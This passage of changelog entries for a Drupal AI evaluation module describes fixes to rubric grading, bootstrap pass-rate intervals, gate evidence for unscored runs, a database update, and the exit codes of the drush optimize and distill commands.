A rubric check set that missed its own threshold used to give the grader a passing score. For example, weighted_avg with threshold 0.9 and a score of 0.80 gave 4.0 out of 5, which passed the default question threshold of 3.5 and also passed a must-pass rubric_checks gate. Now a failed rubric scores 0, so the question fails and must-pass gates fail. Regex errors now report the real PCRE message. Empty phrases and patterns fail their check instead of silently matching. A negative weight fails a weighted_avg rubric. The grader reason now includes each failed check's message, not only its id. Results of existing runs can change on re-grade for rubrics that sat below their threshold.

Impact

Affects site owners.

  • Config change: Stored rubrics with empty phrases/patterns, or negative scoring.weights under weighted_avg, now fail at run time even though the schema allows them.

Technical details

RubricChecksGrader::grade() now returns 0.0 when $verdict['pass'] is false, instead of score * 5.0. Option (a) from the issue was chosen because the grader does not know the question threshold. A rubric threshold of 0 still passes everything. RubricCheckEvaluator compares $score >= $threshold - TOLERANCE (1e-9, matching GateMetric) so floating-point rounding does not fail a rubric that is exactly on its threshold. For weighted_avg, any negative weight in scoring.weights sets the score to 0, forces pass to false and adds negative weight for check <id> to the reason. The other combine modes ignore weights. A weight of 0 still turns a check off. The failed-check part of the reason is now <id or kind>: <check reason>.

StringCheckExecutor::execute() first rejects any empty entry in values (or patterns for regex) with Empty phrase in check <id>. When the check has no id it uses the position, which RubricCheckEvaluator passes through as check_position in the context. For regex, every pattern is now compiled and run before the any/all short-circuit rules apply, so a later bad pattern can no longer be hidden by an earlier match. Compile failures report invalid regex pattern: <pattern> (<PCRE warning>), caught with a temporary error handler. Run-time failures report regex runtime error: <pattern> (<preg_last_error_msg()>), for example backtrack limit or malformed UTF-8.

This commit also bundles fixes for many sibling issues from the same review (#3594906 to #3594926), which are not part of this issue.

item.title: #3594917: The corrected pass rate range has zero width at 0% and 100%, and gate evidence counts runs where no question was scored
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594917 · 1 contributor · 3 comments

Summary

The bootstrap range for the corrected pass rate no longer collapses to a single value when every answer passes or every answer fails. A run of 5 of 5 passes now shows a real range instead of 100% to 100%, so a small run is no longer presented as certain. Separately, a run in which no question received a score (no errors, but no grader gave a score) no longer counts as gate evidence on the target dashboard, the workflow page or the run history. The run history shows "Not scored" for such a run instead of "Errored". Run database updates after upgrading.

Impact

Affects site owners.

  • Database update: Update 10053 adds a nullable scored_count column to ai_eval_result and backfills it from scores_json; imported or unreadable rows stay NULL.
  • Config change: CorrectedPassRateInterface::BOOTSTRAP_METHOD is now parametric_beta_posterior, so the method name in exported envelopes changes; schema/*.schema.json is unchanged.

Technical details

In CorrectedPassRate::runBootstrap() the observed rate was drawn as a binomial around passed / total, which is degenerate at 0 and 1. It is now drawn with BetaBinomialSampler::beta($passed + 1.0, $total - $passed + 1.0), the same way the TPR and TNR draws are made. This changes the method for every rate, so CorrectedPassRateInterface::BOOTSTRAP_METHOD is now parametric_beta_posterior and its docblock describes the new draw. ResultEnvelopeBuilder emits that name. The interval can still be absent under the existing degenerate-draw policy.

Gate evidence uses a new nullable ai_eval_result.scored_count, written from Scorer::targetMetrics($questionScores)['valid_count'] (no error, not unscored) in EvalRunner, EvalRunCommand and ResultRegrader. EnvelopeImporter writes NULL, since imported envelopes have no per-question scores. GateEvidence::measured() returns scored_count > 0 when the column is set and falls back to question_count - error_count > 0 when it is NULL. The same rule is applied in SQL in TargetDashboardController and WorkflowStateService (r.scored_count > 0 OR (r.scored_count IS NULL AND r.question_count > r.error_count)). scored_count is added to the fields selected for the run history, and RunHistory shows "Not scored" for a not-measured run with no errors. ai_eval_update_10053() is a batched update that adds the column and backfills it from scores_json, skipping imported rows and rows whose JSON is unreadable or whose count does not match question_count. The commit also carries fixes for other issues in the #3594906 to #3594926 range, which are not covered here.

Upgrade

Run database updates (drush updatedb). Update 10053 adds and backfills ai_eval_result.scored_count. Code that reads results and needs the count of successfully scored questions can use scored_count (NULL for imported and unreadable legacy rows). item.description:

  • Discussion: #3594915 · 1 contributor · 3 comments

drush ai-eval:optimize and drush ai-eval:distill now exit with a non-zero status when something goes wrong, so CI no longer treats a failed run as a success. optimize also saves an accepted prompt through the agent entity instead of raw config, so entity hooks and cache invalidation run, and it stops with an error if the agent was deleted during the run. distill now reports write failures and includes questions that scored exactly 0.0 in intel_failure_patterns.md.
